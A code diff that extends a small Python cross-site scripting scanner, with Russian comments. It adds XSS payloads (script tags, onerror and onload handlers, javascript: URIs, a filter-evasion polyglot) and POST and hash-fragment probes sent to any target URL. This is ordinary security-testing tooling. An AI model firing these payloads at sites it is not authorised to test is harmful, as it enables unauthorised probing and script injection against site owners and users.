@@ -1,5 +1,6 @@
 import requests
 from urllib.parse import urlencode
+import html
 
 # 🆕 Расширенные payloads (DOM + Reflected)
 XSS_PAYLOADS = [
@@ -7,17 +8,23 @@ XSS_PAYLOADS = [
     "<script>alert(1)</script>",
     "\"><img src=x onerror=alert(1)>",
     "<svg/onload=alert(1)>",
-    # DOM XSS (Juice Shop!)
+    # DOM XSS
     "<iframe src=javascript:alert('xss')>",
     "javascript:alert(1)",
     "jaVasCript:/*-/*`/*\\`/*'/*\"/**/alert(1)//",
     # Hash-based
     "#<img src=x onerror=alert(1)>",
     "?q=<script>alert(1)</script>#",
+    # Дополнительные payloads
+    "'><script>alert(1)</script>",
+    '"/><script>alert(1)</script>',
+    "';alert(1);//",
+    "';alert(1)//",
+    "';alert(1)/*",
 ]
 
 # 🆕 Контексты вставки
-PARAMS = ["q", "query", "search", "s", "test", "data", "input"]
+PARAMS = ["q", "query", "search", "s", "test", "data", "input", "term", "keyword"]
 
 def scan_xss_basic(url: str):
     results = []
@@ -25,16 +32,29 @@ def scan_xss_basic(url: str):
     for param in PARAMS:
         for payload in XSS_PAYLOADS:
             # 1. GET param
-            test_url = f"{url}?{urlencode({param: payload})}"
-            
             try:
-                resp = requests.get(test_url, timeout=8)
-                reflected = any(p in resp.text for p in XSS_PAYLOADS[:3])  # Только HTML payloads
+                # Проверяем GET запрос
+                test_url = f"{url}?{urlencode({param: payload})}"
+                resp = requests.get(test_url, timeout=8, allow_redirects=False)
                 
                 # 2. HASH param (DOM XSS!)
                 hash_url = f"{url}?{param}=test#{payload}"
-                resp_hash = requests.get(hash_url, timeout=5)
-                hash_suspicious = len(resp_hash.text) != len(resp.text)  # Response change
+                resp_hash = requests.get(hash_url, timeout=5, allow_redirects=False)
+                
+                # 3. POST проверка
+                post_url = url
+                post_data = {param: payload}
+                resp_post = requests.post(post_url, data=post_data, timeout=8, allow_redirects=False)
+                
+                # Проверка отражения
+                reflected = (
+                    payload in resp.text or
+                    html.escape(payload) in resp.text or
+                    payload in resp_hash.text or
+                    payload in resp_post.text
+                )
+                
+                hash_suspicious = len(resp_hash.text) != len(resp.text)
                 
                 results.append({
                     "param": param,
@@ -45,8 +65,13 @@ def scan_xss_basic(url: str):
                     "suspicious": reflected or hash_suspicious
                 })
                 
-            except:
-                results.append({"param": param, "suspicious": False})
+            except requests.RequestException as e:
+                results.append({
+                    "param": param,
+                    "payload": payload,
+                    "error": str(e),
+                    "suspicious": False
+                })
     
     return results
 
